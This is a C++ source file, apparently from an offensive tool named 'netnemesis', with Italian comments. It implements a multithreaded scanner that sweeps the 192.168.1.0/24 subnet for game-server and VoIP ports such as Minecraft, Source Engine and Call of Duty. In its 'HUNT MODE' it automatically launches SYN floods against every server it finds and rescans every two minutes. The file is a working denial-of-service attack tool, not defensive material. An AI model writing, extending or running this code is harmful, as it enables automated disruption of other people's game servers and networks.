#include "netnemesis.h"
#include <future>
#include <chrono>

std::atomic<bool> scanner_running(false);

NetworkScanner::NetworkScanner() {}

std::string getGameName(int port) {
    switch(port) {
        case 27015: case 27016: case 27017: case 27018: case 27019: case 27020:
            return "Source Engine (CS:GO/TF2/CSS)";
        case 25565: return "Minecraft";
        case 7777: case 7778: return "Unreal Engine (ARK/etc)";
        case 27960: return "Quake 3 Arena";
        case 28960: return "Call of Duty";
        case 64738: return "Mumble/VoIP";
        case 27005: return "Source TV";
        default: return "Unknown Game";
    }
}

bool NetworkScanner::probePort(const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 200000; 
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    
    int result = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    close(sock);
    return (result == 0);
}

void NetworkScanner::scanRange(int start_host, int end_host, const std::vector<int> &ports, 
                               std::atomic<int> &progress, int total_hosts) {
    for (int host = start_host; host <= end_host && scanner_running && g_running; host++) {
        std::string ip = "192.168.1." + std::to_string(host);
        
        for (int port : ports) {
            if (!scanner_running) break; // Controlla flag specifico
            if (probePort(ip, port)) {
                std::string game = getGameName(port);
                {
                    std::lock_guard<std::mutex> lock(servers_mutex);
                    discovered_servers.push_back({ip, port});
                }
                Utils::logSuccess("\033[1m[SERVER FOUND]\033[0m " + game + 
                    " | IP: \033[36m" + ip + "\033[0m | Port: \033[33m" + 
                    std::to_string(port) + "\033[0m");
            }
        }
        progress++;
        
        if (host % 10 == 0) {
            int percent = (progress * 100) / total_hosts;
            std::lock_guard<std::mutex> lock(g_print_mutex);
            std::cout << "\r\033[34m[SCAN] Progresso: " << percent << "% (" 
                      << progress << "/" << total_hosts << " hosts)\033[0m" << std::flush;
        }
    }
}

void NetworkScanner::scanLoop() {
    std::vector<int> game_ports = {
        27015, 27016, 27017, 27018, 27019, 27020,
        25565, 7777, 7778, 27960, 28960, 64738,
        27005, 27006, 27007, 27008, 27009, 27010
    };
    
    const int total_hosts = 254;
    const int num_threads = 10;
    
    while (g_running) { // Loop esterno controlla g_running
        std::atomic<int> progress(0);
        discovered_servers.clear();
        
        Utils::logInfo("Avvio scansione rete 192.168.1.0/24...");
        Utils::logInfo("Thread paralleli: " + std::to_string(num_threads));
        std::cout << "\033[34m[SCAN] Progresso: 0% (0/" << total_hosts << " hosts)\033[0m" << std::flush;
        
        scanner_running = true;
        std::vector<std::thread> threads;
        int hosts_per_thread = total_hosts / num_threads;
        
        for (int i = 0; i < num_threads; i++) {
            int start = (i * hosts_per_thread) + 1;
            int end = (i == num_threads - 1) ? total_hosts : (start + hosts_per_thread - 1);
            threads.emplace_back(&NetworkScanner::scanRange, this, start, end, 
                                std::cref(game_ports), std::ref(progress), total_hosts);
        }
        
        for (auto &t : threads) {
            if (t.joinable()) t.join();
        }
        
        if (!scanner_running) {
            std::cout << std::endl;
            Utils::logInfo("Scanner fermato dall'utente");
            return; // Esce dal loop senza chiudere il programma
        }
        
        std::cout << std::endl;
        Utils::logInfo("Scansione completata. Server trovati: " + 
            std::to_string(discovered_servers.size()));
        
        if (g_auto_hunt && !discovered_servers.empty()) {
            Utils::logWarning("HUNT MODE: Attacco automatico...");
            for (const auto &server : discovered_servers) {
                PacketCrafter pc;
                pc.initialize();
                pc.sendSYNFlood(server.first, server.second, 100);
            }
        }
        
        Utils::logInfo("Prossima scansione tra 2 minuti...");
        for (int i = 0; i < 120 && g_running && scanner_running; i++) {
            sleep(1);
        }
    }
}

void NetworkScanner::start() {
    scan_thread = std::thread(&NetworkScanner::scanLoop, this);
}

void NetworkScanner::stop() {
    scanner_running = false; // Ferma solo lo scanner, non g_running!
    if (scan_thread.joinable()) {
        scan_thread.join();
    }
}

std::vector<std::pair<std::string, int>> NetworkScanner::getServers() {
    std::lock_guard<std::mutex> lock(servers_mutex);
    return discovered_servers;
}